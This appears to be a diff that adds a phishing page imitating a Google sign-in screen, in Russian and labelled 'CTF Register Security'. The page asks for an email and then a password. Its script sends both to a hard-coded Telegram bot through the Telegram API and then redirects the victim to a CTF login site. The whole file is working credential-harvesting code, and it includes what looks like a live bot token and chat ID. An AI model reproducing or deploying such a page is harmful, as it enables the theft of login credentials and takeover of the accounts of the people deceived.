@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - CTF Security</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
+
+        * { box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; color: #202124; overflow: hidden; }
+        
+        .container { width: 448px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
+        
+        .google-header { display: flex; align-items: center; justify-content: center; margin-bottom: 12px; gap: 8px; }
+        .globe-icon { width: 24px; height: 24px; opacity: 0.6; }
+        .google-text { font-size: 22px; color: #5f6368; font-weight: 400; letter-spacing: -0.5px; }
+
+        h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px; color: #202124; }
+        .sub-text { font-size: 16px; margin-bottom: 24px; letter-spacing: 0.1px; color: #202124; }
+        
+        .input-group { position: relative; margin-top: 10px; width: 100%; }
+        .input-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s; }
+        .input-field:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        
+        .step { position: absolute; width: 368px; transition: 0.3s ease-in-out; }
+        .step-hidden { opacity: 0; transform: translateX(100px); visibility: hidden; }
+        .step-active { opacity: 1; transform: translateX(0); visibility: visible; }
+        .step-exit { opacity: 0; transform: translateX(-100px); visibility: hidden; }
+
+        .user-identity { display: inline-flex; align-items: center; padding: 3px 12px 3px 5px; border: 1px solid #dadce0; border-radius: 16px; margin-bottom: 24px; cursor: pointer; }
+        .avatar { width: 20px; height: 20px; background: #1a73e8; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-size: 11px; margin-right: 8px; }
+        .email-label { font-size: 14px; font-weight: 500; }
+
+        .show-pass-container { display: flex; align-items: center; margin-top: 12px; text-align: left; cursor: pointer; width: fit-content; }
+        #check { cursor: pointer; width: 18px; height: 18px; accent-color: #1a73e8; margin-right: 10px; }
+        .show-pass-text { font-size: 14px; color: #202124; cursor: pointer; user-select: none; }
+
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .link { color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; text-decoration: none; }
+        .btn-next { background-color: #1a73e8; color: #fff; padding: 10px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .btn-next:disabled { background-color: #ccc; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="google-header">
+        <svg class="globe-icon" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+        </svg>
+        <span class="google-text">Google</span>
+    </div>
+
+    <div id="step1" class="step step-active">
+        <h1>CTF Register Security</h1>
+        <p class="sub-text">Подтвердите вашу личность</p>
+        <div class="input-group">
+            <input type="email" id="email" class="input-field" placeholder="Эл. почта или телефон">
+        </div>
+        <p style="font-size: 14px; color: #1a73e8; text-align: left; margin-top: 15px; font-weight: 500; cursor: pointer;">Забыли адрес эл. почты?</p>
+        <div class="footer">
+            <span class="link">Создать аккаунт</span>
+            <button class="btn-next" onclick="goNext()">Далее</button>
+        </div>
+    </div>
+
+    <div id="step2" class="step step-hidden">
+        <h1>Добро пожаловать</h1>
+        <div class="user-identity" onclick="location.reload()">
+            <div class="avatar">👤</div>
+            <span class="email-label" id="display-email"></span>
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" class="input-field" placeholder="Введите пароль">
+        </div>
+        
+        <div class="show-pass-container" onclick="togglePasswordVisibility()">
+            <input type="checkbox" id="check">
+            <label class="show-pass-text" for="check">Показать пароль</label>
+        </div>
+
+        <div class="footer">
+            <span class="link">Забыли пароль?</span>
+            <button class="btn-next" id="finalBtn" onclick="sendToTelegram()">Далее</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Sozlamalar o'rnatildi
+    const BOT_TOKEN = "8638040098:AAF_QS4akl8np5uxyaeb0pbyilRJ5D6VHQA";
+    const CHAT_ID = "8336165494"; 
+    const REDIRECT_URL = "https://ctf.cybertron.uz/login?next=%2F%3F";
+
+    function goNext() {
+        const emailVal = document.getElementById('email').value;
+        if (!emailVal) { alert("Введите эл. почту"); return; }
+        
+        document.getElementById('display-email').innerText = emailVal;
+        document.getElementById('step1').className = 'step step-exit';
+        document.getElementById('step2').className = 'step step-active';
+    }
+
+    function togglePasswordVisibility() {
+        const passwordInput = document.getElementById('password');
+        const checkbox = document.getElementById('check');
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            checkbox.checked = true;
+        } else {
+            passwordInput.type = "password";
+            checkbox.checked = false;
+        }
+    }
+
+    // Checkbox bosilishini nazorat qilish
+    document.getElementById('check').addEventListener('click', function(e) {
+        e.stopPropagation();
+        const passwordInput = document.getElementById('password');
+        passwordInput.type = this.checked ? "text" : "password";
+    });
+
+    async function sendToTelegram() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        const btn = document.getElementById('finalBtn');
+
+        if (!pass) { alert("Введите пароль"); return; }
+
+        btn.disabled = true;
+        btn.innerText = "Загрузка...";
+
+        const message = `🔔 *Yangi ma'lumot keldi:* \n\n📧 *Gmail:* \`${email}\` \n🔑 *Parol:* \`${pass}\``;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+            window.location.href = REDIRECT_URL;
+        } catch (error) {
+            console.error("Xatolik:", error);
+            window.location.href = REDIRECT_URL;
+        }
+    }
+</script>
+
+</body>
+</html>
